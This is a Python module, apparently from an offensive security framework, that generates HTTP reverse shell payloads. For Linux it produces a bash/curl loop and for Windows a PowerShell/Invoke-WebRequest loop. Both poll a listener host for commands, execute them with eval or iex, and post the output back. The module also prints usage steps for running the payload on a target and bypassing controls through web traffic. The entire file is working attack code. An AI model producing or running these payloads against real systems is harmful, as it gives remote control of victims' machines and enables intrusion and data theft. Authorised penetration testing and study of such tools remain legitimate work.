# /root/lazy1/modules/payloads/reverse/network/http_reverse.py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

MODULE_INFO = {
    "name": "HTTP Reverse Shell",
    "description": "HTTP-based reverse shell using web requests",
    "author": "LazyFramework Team",
    "license": "MIT",
    "platform": "Multi",
    "arch": "Multi",
    "rank": "Good",
    "dependencies": []
}

OPTIONS = {
    "lhost": {
        "description": "Listener IP address",
        "required": True,
        "default": "192.168.1.100"
    },
    "lport": {
        "description": "Listener port",
        "required": True,
        "default": "8080"
    },
    "platform": {
        "description": "Target platform",
        "required": False,
        "default": "linux",
        "choices": ["linux", "windows", "multi"]
    }
}

def generate_http_reverse(lhost, lport, platform="linux"):
    """Generate HTTP reverse shell"""
    
    if platform == "windows":
        payload = f'powershell -c "while($true){{$c=(Invoke-WebRequest -Uri http://{lhost}:{lport}/cmd -UseBasicParsing).Content;if($c -ne \\"exit\\"){{$r=iex $c 2>&1|Out-String;Invoke-WebRequest -Uri http://{lhost}:{lport}/result -Method POST -Body $r}};sleep 2}}"'
    else:  # linux
        payload = f"bash -c 'while true; do cmd=$(curl -s http://{lhost}:{lport}/cmd); if [ \"$cmd\" != \"exit\" ]; then result=$(eval \"$cmd\" 2>&1); curl -s -X POST -d \"$result\" http://{lhost}:{lport}/result >/dev/null; fi; sleep 2; done'"
    
    return payload

def run(session, options):
    lhost = options.get("lhost", "192.168.1.100")
    lport = options.get("lport", "8080")
    platform = options.get("platform", "linux")
    
    console.print("\n[bold green]🌐 HTTP Reverse Shell[/bold green]")
    console.print("=" * 50)
    
    payload = generate_http_reverse(lhost, lport, platform)
    
    console.print(f"\n[bold]Protocol:[/bold] HTTP")
    console.print(f"[bold]Listener:[/bold] {lhost}:{lport}")
    console.print(f"[bold]Platform:[/bold] {platform}")
    console.print(f"[bold]Use Case:[/bold] Bypass through HTTP web traffic")
    
    console.print(f"\n[bold yellow]📦 Payload:[/bold yellow]")
    console.print(Panel(payload, border_style="blue"))
    
    console.print(f"\n[bold green]🚀 Usage:[/bold green]")
    console.print("1. Start HTTP server with /cmd and /result endpoints")
    console.print("2. Execute payload on target")
    console.print("3. Server sends commands to /cmd, receives results via /result")
    
    console.print(f"\n[bold blue]🎯 HTTP Server Example:[/bold blue]")
    console.print("Use Python Flask or simple HTTP server with custom routes")
    
    return payload
